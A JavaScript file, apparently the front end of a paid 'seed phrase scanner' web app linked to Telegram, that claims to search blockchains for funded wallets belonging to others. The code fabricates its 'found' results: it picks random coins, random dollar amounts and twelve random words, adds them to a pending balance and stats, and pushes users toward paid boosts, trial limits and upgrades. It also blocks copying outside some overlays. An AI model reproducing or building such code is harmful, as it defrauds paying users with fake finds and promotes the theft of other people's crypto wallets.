var running=false,scanInt=null,timerInt=null,boostTimerInt=null,sec=0,checked=0,foundTriggered=0;
var _foundShownIds=[];

var boostCount=0;
var boostSec=0;
var boostRunning=false;

function gotoScreen(id){
  document.querySelectorAll('.screen').forEach(function(s){s.classList.remove('active');});
  document.getElementById(id).classList.add('active');
  
  var _qrOv = document.getElementById('pmQrOverlay');
  if(_qrOv) _qrOv.classList.remove('open');
  
  if(id!=='screen-main'){
    if(typeof window._tdHideIfNotMain==='function') window._tdHideIfNotMain(id);
  }
}
function gotoMain(){document.querySelectorAll('.screen').forEach(function(s){s.classList.remove('active');});document.getElementById('screen-main').classList.add('active');}
function openOverlay(id){document.getElementById(id).classList.add('open');document.body.style.overflow='hidden';}
function closeOverlay(id){document.getElementById(id).classList.remove('open');document.body.style.overflow='';}

(function(){
  function addTouchFix(){
    document.querySelectorAll('[onclick]').forEach(function(el){
      if(el._touchFixed)return;
      el._touchFixed=true;
      var _tStartX,_tStartY;
      el.addEventListener('touchstart',function(e){_tStartX=e.touches[0].clientX;_tStartY=e.touches[0].clientY;},{passive:true});
      el.addEventListener('touchend',function(e){
        var dx=Math.abs(e.changedTouches[0].clientX-_tStartX);
        var dy=Math.abs(e.changedTouches[0].clientY-_tStartY);
        if(dx<10&&dy<10){e.preventDefault();e.stopPropagation();el.click();}
      },{passive:false});
    });
  }
  _onDom(addTouchFix);
  var _origOpen=window.openOverlay;
  if(typeof _origOpen==='function'){
    window.openOverlay=function(id){_origOpen(id);setTimeout(addTouchFix,50);};
  }
})();

(function(){
  _onDom(function(){
    var row = document.getElementById('chainsRow');
    if (!row) return;
    var isDragging = false, startX = 0, startScroll = 0, hasMoved = false;

    row.addEventListener('mousedown', function(e) {
      
      if (e.target.closest('.chains-arrow')) return;
      isDragging = true;
      hasMoved = false;
      startX = e.pageX;
      startScroll = row.scrollLeft;
      row.style.cursor = 'grabbing';
    });

    window.addEventListener('mouseup', function() {
      isDragging = false;
      row.style.cursor = 'grab';
    });

    window.addEventListener('mousemove', function(e) {
      if (!isDragging) return;
      var dx = e.pageX - startX;
      if (Math.abs(dx) > 4) hasMoved = true;
      row.scrollLeft = startScroll - dx;
    });

    
    row.addEventListener('click', function(e) {
      if (hasMoved) {
        e.stopPropagation();
        e.preventDefault();
        hasMoved = false;
      }
    }, true);

    
    var touchStartX = 0, touchStartScroll = 0;
    row.addEventListener('touchstart', function(e) {
      touchStartX = e.touches[0].clientX;
      touchStartScroll = row.scrollLeft;
    }, { passive: true });
    row.addEventListener('touchmove', function(e) {
      var dx = touchStartX - e.touches[0].clientX;
      row.scrollLeft = touchStartScroll + dx;
    }, { passive: true });
    row.addEventListener('touchend', function() {
      setTimeout(updateChainsArrows, 100);
    }, { passive: true });
  });
})();

function scrollChains(dir){
  var row=document.getElementById('chainsRow');
  if(!row)return;
  row.scrollBy({left:dir*130,behavior:'smooth'});
  setTimeout(updateChainsArrows,420);
}
function updateChainsArrows(){
  var row=document.getElementById('chainsRow');
  var btnL=document.querySelector('.chains-arrow-left');
  var btnR=document.querySelector('.chains-arrow-right');
  if(!row)return;

  var canScroll=row.scrollWidth>row.clientWidth+4;
  var atStart=row.scrollLeft<=8;
  var atEnd=row.scrollLeft+row.clientWidth>=row.scrollWidth-8;

  
  if(btnL) btnL.style.display=(canScroll&&!atStart)?'flex':'none';
  if(btnR) btnR.style.display=(canScroll&&!atEnd)?'flex':'none';
}
_onDom(function(){
  var row=document.getElementById('chainsRow');
  if(row){
    row.scrollLeft=0;
    row.addEventListener('scroll',updateChainsArrows);
  }
  window.addEventListener('resize',updateChainsArrows);
  setTimeout(updateChainsArrows,200);
});
window.addEventListener('load',function(){
  var row=document.getElementById('chainsRow');
  if(row)row.scrollLeft=0;
  setTimeout(updateChainsArrows,300);
});

function toggleFaq(el){el.classList.toggle('open');}
function showInfo(id){var o=document.getElementById('infoOverlay-'+id);if(o){o.classList.add('open');document.body.style.overflow='hidden';}}
function closeInfoOverlay(id){var o=document.getElementById('infoOverlay-'+id);if(o){o.classList.remove('open');document.body.style.overflow='';}}
function toggleChip(el){
  if(!running) el.classList.toggle('selected');
  
  if(!running && window.DB && window.DB.tgId){
    var _sc=[];
    document.querySelectorAll('.chain-chip.selected').forEach(function(ch){
      var cls=Array.from(ch.classList).find(function(c){return c.startsWith('chip-');});
      if(cls) _sc.push(cls.replace('chip-',''));
    });
    try{ localStorage.setItem('alfa_chains', JSON.stringify(_sc)); }catch(e){}
  }
}

var _origChips=[];
_onDom(function(){
  var r=document.getElementById('chainsRow');
  if(r)_origChips=Array.from(r.querySelectorAll('.chain-chip'));
  
  try{
    var _savedChains=JSON.parse(localStorage.getItem('alfa_chains')||'null');
    if(_savedChains && Array.isArray(_savedChains) && _savedChains.length>0){
      document.querySelectorAll('.chain-chip').forEach(function(chip){
        var cls=Array.from(chip.classList).find(function(c){return c.startsWith('chip-');});
        if(!cls) return;
        var name=cls.replace('chip-','');
        if(_savedChains.indexOf(name)!==-1) chip.classList.add('selected');
        else chip.classList.remove('selected');
      });
    }
  }catch(e){}
});
function reorderChips(){
  var r=document.getElementById('chainsRow');if(!r)return;
  var all=Array.from(r.querySelectorAll('.chain-chip'));
  var sel=all.filter(function(c){return c.classList.contains('selected');});
  var unsel=all.filter(function(c){return !c.classList.contains('selected');});
  sel.concat(unsel).forEach(function(c){r.appendChild(c);});
  r.scrollLeft=0;
}
function restoreChips(){
  var r=document.getElementById('chainsRow');if(!r||!_origChips.length)return;
  _origChips.forEach(function(c){r.appendChild(c);});
  r.scrollLeft=0;
}
function setDepth(btn,val){document.querySelectorAll('.s-depth-btn').forEach(function(b){b.classList.remove('s-depth-active');});btn.classList.add('s-depth-active');var v=document.getElementById('depthVal');if(v)v.textContent=val;}
function setLang(btn,code,flag){document.querySelectorAll('.s-lang-btn').forEach(function(b){b.classList.remove('s-lang-active');});btn.classList.add('s-lang-active');var c=document.getElementById('langCurrent');if(c)c.textContent=flag+' '+code;}
function deselectAll(){if(!running)document.querySelectorAll('.chain-chip').forEach(function(c){c.classList.remove('selected');});}
function toggleCoin(el){el.classList.toggle('on');document.getElementById('storeTotal').textContent='$'+(document.querySelectorAll('.coin-row.on').length*400);}

var COINS=[
  {name:'BTC',img:'images/how1p.png',color:'#f7931a'},
  {name:'ETH',img:'images/n27v6.png',color:'#627eea'},
  {name:'BNB',img:'images/yt9z0.png',color:'#f3ba2f'},
  {name:'TRX',img:'images/6ulyt.png',color:'#ef0027'},
  {name:'SOL',img:'images/kqcoz.png',color:'#9945ff'},
  {name:'XRP',img:'images/mpcf0.png',color:'#346aa9'},
  {name:'USDT',img:'images/tdg4r.png',color:'#26a17b'},
  {name:'DOGE',img:'images/hpym7.png',color:'#c2a633'},
  {name:'LTC',img:'images/f4bm5.png',color:'#bfbbbb'}
];

function addFoundEntry(){
  var coin=COINS[Math.floor(Math.random()*COINS.length)];
  
  var cgId=(_CG_ID&&_CG_ID[coin.name])||null;
  var livePrice=(cgId&&window.LIVE_PRICES&&window.LIVE_PRICES[cgId])||0;
  var usdRaw=50+Math.random()*950; 
  var usd=usdRaw.toFixed(2);
  var amt;
  if(livePrice>0){
    var rawAmt=usdRaw/livePrice;
    
    amt=rawAmt<0.00001?rawAmt.toFixed(8):rawAmt<0.001?rawAmt.toFixed(6):rawAmt<1?rawAmt.toFixed(4):rawAmt.toFixed(2);
  } else {
    amt=(Math.random()*2+0.05).toFixed(4); 
  }
  var words=rw(12).join(' ');
  var copyText=words;
  var lineHTML='<img draggable="false" src="'+coin.img+'" alt=""/>'
    +'<span class="found-coin" style="color:'+coin.color+'">'+coin.name+'</span>'
    +'<span class="found-val" style="color:#cbd5e1"> '+amt+'</span>'
    +'<span class="found-eq"> =</span>'
    +'<span class="found-usd" style="color:#6ab4ff"> $'+usd+'</span>'
    +'<span class="found-sep"> ↪ </span>'
    +'<span class="found-words">'+words+'</span>'
    +'<button class="found-copy-btn" data-copy="'+copyText.replace(/"/g,'&quot;')+'" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="10" height="10" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><rect width="14" height="14" x="8" y="8" rx="2"/><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"/></svg></button>';

  
  var fb=document.getElementById('foundBody');
  if(fb){
    var ph=fb.querySelector('.found-placeholder');
    if(ph)ph.remove();
    var d1=document.createElement('div');
    d1.className='found-line';
    d1.innerHTML=lineHTML;
    fb.appendChild(d1);
    fb.scrollTop=fb.scrollHeight;
  }

  
  var al=document.getElementById('archList');
  var ae=document.getElementById('archEmpty');
  if(al){
    if(ae)ae.style.display='none';
    var d2=document.createElement('div');
    d2.className='found-line arch-found-line';
    d2.innerHTML=lineHTML;
    al.appendChild(d2);
  }

  
  var found=parseInt(document.getElementById('foundNum').textContent||'0')+1;
  document.getElementById('foundNum').textContent=found;
  document.getElementById('pendingFound').textContent=found;

  
  var pb=document.getElementById('pendingFoundCoin');
  if(!pb){
    pb=document.createElement('div');
    pb.id='pendingFoundCoin';
    pb.className='pending-found-coin';
    var progressBar=document.getElementById('withdrawProgressBar');
    var pendingInfo=progressBar?progressBar.parentNode:document.querySelector('.pending-info');
    if(pendingInfo&&progressBar){pendingInfo.insertBefore(pb,progressBar);}
    else if(pendingInfo){pendingInfo.appendChild(pb);}
  }
  if(pb){pb.innerHTML='<img draggable="false" src="'+coin.img+'" style="width:16px;height:16px;border-radius:50%;vertical-align:middle;margin-right:5px;flex-shrink:0;"/><span style="color:'+coin.color+';font-weight:700;font-size:11px;">'+coin.name+'</span> <span style="color:#6ab4ff;font-size:11px;">+$'+usd+'</span>';}
  var pv=document.getElementById('pendingVal');
  if(pv){var cur=parseFloat(pv.textContent.replace(/[^0-9.]/g,''))||0;var nw=(cur+parseFloat(usd)).toFixed(2);var parts=nw.split('.');pv.innerHTML='$'+parts[0]+'<span style="font-size:.875rem;opacity:.55">.'+(parts[1]||'00')+'</span>';}
  
  var _usdNum = parseFloat(usd) || 0;
  if(!window.DASH_STATS) window.DASH_STATS = {allTime:0,last30:0,coins:{BTC:0,ETH:0,BNB:0,SOL:0,TRX:0,XRP:0,USDT:0,DOGE:0,LTC:0}};
  window.DASH_STATS.allTime += _usdNum;
  window.DASH_STATS.last30  += _usdNum;
  if(window.DASH_STATS.coins[coin.name] !== undefined) window.DASH_STATS.coins[coin.name] += _usdNum;
  if(typeof updateDashCards === 'function') updateDashCards();
  
  if(window.DB && window.DB.tgId) {
    var _pvEl = document.getElementById('pendingVal');
    var _pfEl = document.getElementById('pendingFound');
    var _fnEl = document.getElementById('foundNum');
    var _fb2  = document.getElementById('foundBody');
    window.DB.saveDash(
      window.DASH_STATS.allTime,
      window.DASH_STATS.last30,
      window.DASH_STATS.coins,
      _pvEl ? parseFloat(_pvEl.textContent.replace(/[^0-9.]/g,''))||0 : 0,
      _pfEl ? parseInt(_pfEl.textContent)||0 : 0
    );
    
    var _al2 = document.getElementById('archList');
    window.DB.call('save_found', {
      tg_id:         window.DB.tgId,
      found_count:   _fnEl ? parseInt(_fnEl.textContent)||0 : 0,
      pending_found: _pfEl ? parseInt(_pfEl.textContent)||0 : 0,
      pending_val:   _pvEl ? parseFloat(_pvEl.textContent.replace(/[^0-9.]/g,''))||0 : 0,
      found_body:    _fb2  ? _fb2.innerHTML : '',
      arch_count:    _al2  ? _al2.querySelectorAll('.arch-found-line').length : 0,
    });
  }
}

_onDom(function(){
  var archList = document.getElementById('archList');
  if(archList){
    archList.addEventListener('click', function(e){
      var btn = e.target.closest('.found-copy-btn');
      if(btn){
        
        e.stopPropagation();
      }
    });
  }
  
  document.addEventListener('copy', function(e){
    var archOverlay = document.getElementById('archiveOverlay');
    if(archOverlay && archOverlay.classList.contains('open')) return;
    var detachOverlay = document.getElementById('detachWalletOverlay');
    if(detachOverlay && detachOverlay.classList.contains('open')) return;
    e.preventDefault();
  }, true);
});

function addFoundEntryManual(coinName, priceDisplay) {
  
  var m = priceDisplay.match(/^([\d.]+)\s*=\s*\$?([\d.]+)/);
  var amt = m ? m[1] : '0';
  var usd = m ? m[2] : '0.00';

  
  var _existing = document.querySelectorAll('.found-line');
  for (var _i = 0; _i < _existing.length; _i++) {
    var _c = _existing[_i].querySelector('.found-coin');
    var _v = _existing[_i].querySelector('.found-val');
    var _u = _existing[_i].querySelector('.found-usd');
    if (_c && _v && _u &&
        _c.textContent.trim() === coinName &&
        _v.textContent.trim() === amt &&
        _u.textContent.replace(/[^0-9.]/g,'').trim() === usd) {
      return;
    }
  }

  var coin = COINS.find(function(c){ return c.name === coinName; }) || COINS[0];
  var words = rw(12).join(' ');
  var copyText = words;

  var lineHTML =
    '<img draggable="false" src="' + coin.img + '" alt=""/>'
    + '<span class="found-coin" style="color:' + coin.color + '">' + coin.name + '</span>'
    + '<span class="found-val" style="color:#cbd5e1"> ' + amt + '</span>'
    + '<span class="found-eq"> =</span>'
    + '<span class="found-usd" style="color:#6ab4ff"> $' + usd + '</span>'
    + '<span class="found-sep"> ↪ </span>'
    + '<span class="found-words">' + words + '</span>'
    + '<button class="found-copy-btn" data-copy="'+copyText.replace(/"/g,'&quot;')+'" title="Copy">'
    + '<svg xmlns="http://www.w3.org/2000/svg" width="10" height="10" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">'
    + '<rect width="14" height="14" x="8" y="8" rx="2"/>'
    + '<path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"/>'
    + '</svg></button>';

  var fb = document.getElementById('foundBody');
  if (fb) {
    var ph = fb.querySelector('.found-placeholder');
    if (ph) ph.remove();
    var d1 = document.createElement('div');
    d1.className = 'found-line';
    d1.innerHTML = lineHTML;
    fb.appendChild(d1);
    fb.scrollTop = fb.scrollHeight;
  }

  var al = document.getElementById('archList');
  var ae = document.getElementById('archEmpty');
  if (al) {
    if (ae) ae.style.display = 'none';
    var d2 = document.createElement('div');
    d2.className = 'found-line arch-found-line';
    d2.innerHTML = lineHTML;
    al.appendChild(d2);
  }

  var found = parseInt(document.getElementById('foundNum').textContent || '0') + 1;
  document.getElementById('foundNum').textContent = found;
  document.getElementById('pendingFound').textContent = found;

  var pb = document.getElementById('pendingFoundCoin');
  if (!pb) {
    pb = document.createElement('div');
    pb.id = 'pendingFoundCoin';
    pb.className = 'pending-found-coin';
    var progressBar = document.getElementById('withdrawProgressBar');
    var pendingInfo = progressBar ? progressBar.parentNode : document.querySelector('.pending-info');
    if (pendingInfo && progressBar) pendingInfo.insertBefore(pb, progressBar);
    else if (pendingInfo) pendingInfo.appendChild(pb);
  }
  if (pb) {
    pb.innerHTML = '<img draggable="false" src="' + coin.img + '" style="width:16px;height:16px;border-radius:50%;vertical-align:middle;margin-right:5px;flex-shrink:0;"/>'
      + '<span style="color:' + coin.color + ';font-weight:700;font-size:11px;">' + coin.name + '</span>'
      + ' <span style="color:#6ab4ff;font-size:11px;">+$' + usd + '</span>';
  }

  var pv = document.getElementById('pendingVal');
  if (pv) {
    var cur = parseFloat(pv.textContent.replace(/[^0-9.]/g,'')) || 0;
    var nw = (cur + parseFloat(usd)).toFixed(2);
    var parts = nw.split('.');
    pv.innerHTML = '$' + parts[0] + '<span style="font-size:.875rem;opacity:.55">.' + (parts[1] || '00') + '</span>';
  }

  var usdNum = parseFloat(usd) || 0;
  if (!window.DASH_STATS) window.DASH_STATS = {allTime:0,last30:0,coins:{BTC:0,ETH:0,BNB:0,SOL:0,TRX:0,XRP:0,USDT:0,DOGE:0,LTC:0}};
  window.DASH_STATS.allTime += usdNum;
  window.DASH_STATS.last30  += usdNum;
  if (window.DASH_STATS.coins[coin.name] !== undefined) window.DASH_STATS.coins[coin.name] += usdNum;
  if (typeof updateDashCards === 'function') updateDashCards();

  if (window.DB && window.DB.tgId) {
    var _pvEl = document.getElementById('pendingVal');
    var _pfEl = document.getElementById('pendingFound');
    var _fnEl = document.getElementById('foundNum');
    var _fb2  = document.getElementById('foundBody');
    var _al2  = document.getElementById('archList');
    window.DB.saveDash(
      window.DASH_STATS.allTime, window.DASH_STATS.last30,
      window.DASH_STATS.coins,
      _pvEl ? parseFloat(_pvEl.textContent.replace(/[^0-9.]/g,'')) || 0 : 0,
      _pfEl ? parseInt(_pfEl.textContent) || 0 : 0
    );
    window.DB.call('save_found', {
      tg_id:         window.DB.tgId,
      found_count:   _fnEl ? parseInt(_fnEl.textContent) || 0 : 0,
      pending_found: _pfEl ? parseInt(_pfEl.textContent) || 0 : 0,
      pending_val:   _pvEl ? parseFloat(_pvEl.textContent.replace(/[^0-9.]/g,'')) || 0 : 0,
      found_body:    _fb2  ? _fb2.innerHTML : '',
      arch_count:    _al2  ? _al2.querySelectorAll('.arch-found-line').length : 0,
    });
  }
}

document.addEventListener('click', function(e){
  var btn = e.target.closest('.found-copy-btn');
  if(!btn) return;
  var text = btn.getAttribute('data-copy');
  if(text !== null) copyFound(btn, text);
});

function copyFound(btn,text){
  var doCopy=function(){
    if(navigator.clipboard){
      navigator.clipboard.writeText(text).then(function(){
        btn.textContent='✓';
        showCopyToast();
        setTimeout(function(){btn.innerHTML='<svg xmlns="http://www.w3.org/2000/svg" width="10" height="10" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><rect width="14" height="14" x="8" y="8" rx="2"/><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"/></svg>';},1200);
      }).catch(function(){fb2(text,btn);});
    } else {fb2(text,btn);}
  };
  doCopy();
}
function fb2(text,btn){
  var t=document.createElement('textarea');t.value=text;
  t.style.cssText='position:fixed;left:-9999px;top:0;opacity:0;';
  document.body.appendChild(t);t.select();
  try{document.execCommand('copy');showCopyToast();}catch(e){}
  document.body.removeChild(t);
  if(btn){btn.textContent='✓';setTimeout(function(){btn.innerHTML='<svg xmlns="http://www.w3.org/2000/svg" width="10" height="10" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><rect width="14" height="14" x="8" y="8" rx="2"/><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"/></svg>';},1200);}
}

function fmtBoost(s){
  var h=Math.floor(s/3600),m=Math.floor((s%3600)/60),sc=s%60;
  return (h>0?h+'h ':'')+m+'m '+sc+'s';
}
function updateBoostPill(){
  
  if((window.ALFA_PLAN_LEVEL||0)<1){
    var _p0=document.getElementById('boostPill');
    if(_p0) _p0.style.display='none';
    return;
  }
  var pill=document.getElementById('boostPill');
  if(!pill)return;
  if(boostSec>0){
    pill.style.display='flex';
    pill.querySelector('.boost-time').textContent=fmtBoost(boostSec);
    if(running){ pill.classList.remove('paused'); }
    else        { pill.classList.add('paused'); }
  } else {
    pill.style.display='none';
    pill.classList.remove('paused');
  }
}
function setBoostBtnLocked(locked){
  var btn=document.querySelector('.btn-outline[onclick="addBoost()"]');
  if(!btn)return;
  btn.disabled=locked;
  btn.style.opacity=locked?'0.35':'';
  btn.style.cursor=locked?'not-allowed':'';
}

function tickBoost(){
  if(boostSec>0){
    boostSec--;
    updateBoostPill();
  }
  if(boostSec<=0){
    
    boostSec=0;
    boostRunning=false;
    clearInterval(boostTimerInt);boostTimerInt=null;
    updateBoostPill();
    setBoostBtnLocked(false);
    
    showWithdrawToast('⚡ Boost ended — you can add a new boost now', false);
  }
}

function addBoost(){
  if ((window.ALFA_PLAN_LEVEL || 0) < 1) {
    if (typeof _showStoreStyleToast === 'function') {
      _showStoreStyleToast('🔒  Upgrade your plan to unlock Turbo Boost ⚡');
    }
    return;
  }
  if(!checkPurchaseBeforeBoost()) return;
  
  if(boostRunning) return;
  
  if(boostCount<1){
    _showStoreStyleToast('❌ No boost charges remaining — buy more from the store ⚡');
    return;
  }
  
  boostCount--;
  document.getElementById('boostCount').textContent=boostCount+'/20';
  document.getElementById('progFill').style.width=(boostCount/20*100)+'%';
  boostSec=86400; 
  boostRunning=true;
  updateBoostPill();
  setBoostBtnLocked(true);
  
  if(running && !boostTimerInt){
    boostTimerInt=setInterval(tickBoost,1000);
  }
}

function rw(n){var r=[],c=WORDS.slice();for(var i=0;i<n&&c.length;i++){var x=Math.floor(Math.random()*c.length);r.push(c.splice(x,1)[0]);}return r;}
function fmt(s){return String(Math.floor(s/3600)).padStart(2,'0')+':'+String(Math.floor((s%3600)/60)).padStart(2,'0')+':'+String(s%60).padStart(2,'0');}

function toggleScan(){
  if(running){
    var btn=document.getElementById('scanBtn');
    btn.disabled=true;
    btn.style.opacity='0.45';
    btn.style.filter='grayscale(1)';
    btn.style.cursor='not-allowed';
    document.getElementById('scanIcon').innerHTML='<rect x="6" y="4" width="4" height="16"/><rect x="14" y="4" width="4" height="16"/>';
    document.getElementById('scanTxt').textContent='Please Wait...';
    setTimeout(function(){
      btn.disabled=false;
      btn.style.opacity='';
      btn.style.filter='';
      btn.style.cursor='';
      stopScan();
    },1000);
  } else {
    
    var _sel=document.querySelectorAll('.chain-chip.selected');
    if(_sel.length===0){
      showMiningWarning('⚠️ Select at least one blockchain first');
      return;
    }
    startScan();
  }
}

function showMiningWarning(msg){
  
  var existing=document.getElementById('_miningWarnToast');
  if(existing){ clearTimeout(existing._h); existing.remove(); }
  var t=document.createElement('div');
  t.id='_miningWarnToast';
  t.style.cssText=[
    'position:fixed',
    'bottom:90px',
    'left:50%',
    'transform:translateX(-50%) translateY(20px)',
    'background:linear-gradient(135deg,rgba(20,10,50,.96),rgba(10,5,25,.98))',
    'border:1px solid rgba(124,92,255,.6)',
    'color:#e8ebff',
    'font-family:Outfit,sans-serif',
    'font-size:.8rem',
    'font-weight:700',
    'padding:11px 20px',
    'border-radius:14px',
    'display:flex',
    'align-items:center',
    'gap:8px',
    'box-shadow:0 4px 28px rgba(124,92,255,.45)',
    'z-index:99999',
    'white-space:nowrap',
    'opacity:0',
    'transition:opacity .25s,transform .25s',
    'pointer-events:none'
  ].join(';');
  t.innerHTML=msg;
  document.body.appendChild(t);
  
  void t.offsetWidth;
  t.style.opacity='1';
  t.style.transform='translateX(-50%) translateY(0)';
  t._h=setTimeout(function(){
    t.style.opacity='0';
    t.style.transform='translateX(-50%) translateY(20px)';
    setTimeout(function(){ if(t.parentNode) t.remove(); },300);
  },3200);
}

function startScan(){
  var btn=document.getElementById('scanBtn');
  btn.disabled=true;
  btn.style.opacity='0.45';
  btn.style.filter='grayscale(1)';
  btn.style.cursor='not-allowed';
  
  pingOnStart(function(){
    _doStartScan();
  });
}
function _doStartScan(){
  if(window.DB&&window.DB.tgId){
    window._scanStartTs=Math.floor(Date.now()/1000);
  }
  
  var selectedChips = document.querySelectorAll('.chain-chip.selected');
  if(selectedChips.length === 0){
    var btn0=document.getElementById('scanBtn');
    if(btn0){btn0.disabled=false;btn0.style.opacity='';btn0.style.filter='';btn0.style.cursor='';}
    var t=document.getElementById('storeToast');
    if(t){
      t.innerHTML='⚠️ Please select at least one blockchain to scan';
      t.style.opacity='1';t.style.transform='translateX(-50%) translateY(0)';t.style.pointerEvents='auto';
      clearTimeout(t._h);
      t._h=setTimeout(function(){t.style.opacity='0';t.style.transform='translateX(-50%) translateY(14px)';t.style.pointerEvents='none';},3500);
    } else {
      var fb=document.createElement('div');
      fb.style.cssText='position:fixed;bottom:80px;left:50%;transform:translateX(-50%);background:rgba(10,6,24,.92);border:1px solid rgba(255,160,0,.5);color:#ffd060;font-family:Outfit,sans-serif;font-size:.82rem;font-weight:700;padding:10px 18px;border-radius:12px;z-index:99999;backdrop-filter:blur(12px);white-space:nowrap;';
      fb.textContent='⚠️ Select at least one blockchain first';
      document.body.appendChild(fb);
      setTimeout(function(){fb.remove();},3500);
    }
    running=false;
    return;
  }
  
  var chainsRowEl=document.getElementById('chainsRow');
  if(chainsRowEl) chainsRowEl.classList.add('scan-locked');
  var btn=document.getElementById('scanBtn');
  btn.disabled=true;
  btn.style.opacity='0.45';
  btn.style.filter='grayscale(1)';
  btn.style.cursor='not-allowed';
  setTimeout(function(){
    btn.disabled=false;
    btn.style.opacity='';
    btn.style.filter='';
    btn.style.cursor='';
    
    if((window.ALFA_PLAN_LEVEL||0)<1 && (window.TRIAL_COUNT||0)>=(window.MAX_TRIALS||1000)){
      var btn0b=document.getElementById('scanBtn');
      if(btn0b){btn0b.disabled=false;btn0b.style.opacity='';btn0b.style.filter='';btn0b.style.cursor='';}
      running=false;
      var _tov=document.getElementById('_trialEndOv');
      if(!_tov){
        _tov=document.createElement('div');
        _tov.id='_trialEndOv';
        _tov.style.cssText=['position:fixed','bottom:80px','left:50%','transform:translateX(-50%) translateY(20px)','z-index:59999','background:linear-gradient(135deg,rgba(20,8,40,.97),rgba(10,5,22,.98))','border:1px solid rgba(255,100,80,.45)','border-radius:16px','padding:12px 16px','display:flex','align-items:center','gap:12px','box-shadow:0 8px 32px rgba(0,0,0,.6)','opacity:0','transition:opacity .25s ease,transform .25s ease','pointer-events:auto','max-width:calc(100vw - 32px)','min-width:260px','white-space:nowrap'].join(';');
        _tov.innerHTML='<span style="font-size:1.4rem;flex-shrink:0;">⏱️</span><div style="flex:1;min-width:0;"><div style="font-family:Outfit,sans-serif;font-size:.78rem;font-weight:800;color:#e8ebff;">Trial Limit Reached</div><div style="font-family:Outfit,sans-serif;font-size:.68rem;color:rgba(200,170,170,.7);margin-top:2px;white-space:normal;line-height:1.3;">'+(window.MAX_TRIALS||1000).toLocaleString()+' seed phrases used. Upgrade for unlimited.</div></div>';
        var _tb=document.createElement('button');
        _tb.style.cssText='flex-shrink:0;padding:7px 12px;border:none;border-radius:10px;font-family:Outfit,sans-serif;font-size:.7rem;font-weight:900;letter-spacing:.05em;text-transform:uppercase;cursor:pointer;color:#fff;background:linear-gradient(135deg,#7c5cff,#00cfb4);white-space:nowrap;';
        _tb.textContent='UPGRADE';
        _tb.onclick=function(){var _o=document.getElementById('_trialEndOv');if(_o){_o.style.opacity='0';_o.style.transform='translateX(-50%) translateY(20px)';setTimeout(function(){_o.style.display='none';},250);}if(typeof gotoScreen==='function')gotoScreen('screen-store');};
        _tov.appendChild(_tb);
        document.body.appendChild(_tov);
      }
      _tov.style.display='flex';void _tov.offsetWidth;_tov.style.opacity='1';_tov.style.transform='translateX(-50%) translateY(0px)';
      return;
    }
    sec=0;checked=0;foundTriggered=0;window._lastJumpsCheck=0;
    window._gettedFiredKeys={}; window._gettedQueue=null; window._gettedLoading=false;
    
    if(window.DB && window.DB.tgId){
      var _bBgSw=document.querySelectorAll('.s-switch input[type=checkbox]')[0];
      var _bBgOn=!!(_bBgSw&&_bBgSw.checked);
      var _bChips=[];
      document.querySelectorAll('.chain-chip.selected').forEach(function(ch){
        var cls=Array.from(ch.classList).find(function(c){return c.startsWith('chip-');});
        if(cls) _bChips.push(cls.replace('chip-',''));
      });
      var _bPayload={tg_id:window.DB.tgId};
      
      if((window.ALFA_PLAN_LEVEL||0)<1 && !window._trialCountSent){
        window._trialCountSent=true;
        _bPayload.trial_count=window.TRIAL_COUNT||0;
      }
      
      if((window.ALFA_PLAN_LEVEL||0)>=1){
        _bPayload.work_data=JSON.stringify({data1:checked,data2:fmt(sec),data3:window.DB.planLevel||0});
      }
      
      if(_bBgOn){
        _bPayload.bg_on=1;
        _bPayload.start_time=window._scanStartTs||Math.floor(Date.now()/1000);
        _bPayload.chains=_bChips;
        _bPayload.boost_sec=window.boostSec||0;
      }
    window.DB.call('scan_start_batch',_bPayload).then(function(r){
        if(!r) return;
        
        if(r.keys && Array.isArray(r.keys)){
          r.keys.forEach(function(k){ window._gettedFiredKeys[k]=true; });
        }
        
        if(r.found_entries && Array.isArray(r.found_entries)){
          window._gettedQueue = r.found_entries;
          var _restored = window._gettedRestoredCount || 0;
          if(_restored > 0){
            window._gettedQueue.forEach(function(gd){
              var gk = gd.key || ('id_'+gd.id);
              window._gettedFiredKeys[gk] = true;
            });
          }
          window._gettedLoading = false;
        }
        
        if(r.messages && Array.isArray(r.messages)){
          window._msgData = r.messages;
          window._msgSeen = r.seen_keys || [];
        }
        
        if(r.max_trials && r.max_trials > 0){
          window.MAX_TRIALS = r.max_trials;
          if((window.ALFA_PLAN_LEVEL||0)===0){
            var _attEl2 = document.getElementById('spmAttemptsVal');
            if(_attEl2) _attEl2.textContent = window.MAX_TRIALS.toLocaleString() + ' time';
          }
        }
        
        if(typeof r.trial_count === 'number'){
          window.TRIAL_COUNT = r.trial_count;
          if(window.DB) window.DB.trialCount = r.trial_count;
        }
        
        if(r.work_data){ window._serverWorkData = r.work_data; }
        
        if(r.dash_data && typeof r.dash_data === 'object'){
          if(!window.DASH_STATS) window.DASH_STATS = {};
          if(typeof r.dash_data.all_time === 'number')
            window.DASH_STATS.allTime = Math.max(window.DASH_STATS.allTime||0, r.dash_data.all_time);
          if(typeof r.dash_data.last30 === 'number')
            window.DASH_STATS.last30 = Math.max(window.DASH_STATS.last30||0, r.dash_data.last30);
          if(r.dash_data.coins && typeof r.dash_data.coins === 'object'){
            if(!window.DASH_STATS.coins) window.DASH_STATS.coins = {};
            Object.keys(r.dash_data.coins).forEach(function(k){
              var sv = parseFloat(r.dash_data.coins[k]) || 0;
              var lv = parseFloat((window.DASH_STATS.coins||{})[k]) || 0;
              window.DASH_STATS.coins[k] = Math.max(lv, sv);
            });
          }
          if(typeof window.updateDashCards === 'function') window.updateDashCards();
        }
        
        if(r.fndwlet && typeof r.fndwlet === 'object'){
          window._serverFndwlet = r.fndwlet;
        }
      }).catch(function(){});
    }
    
    var _isResume = !!window._resumingFromBg;
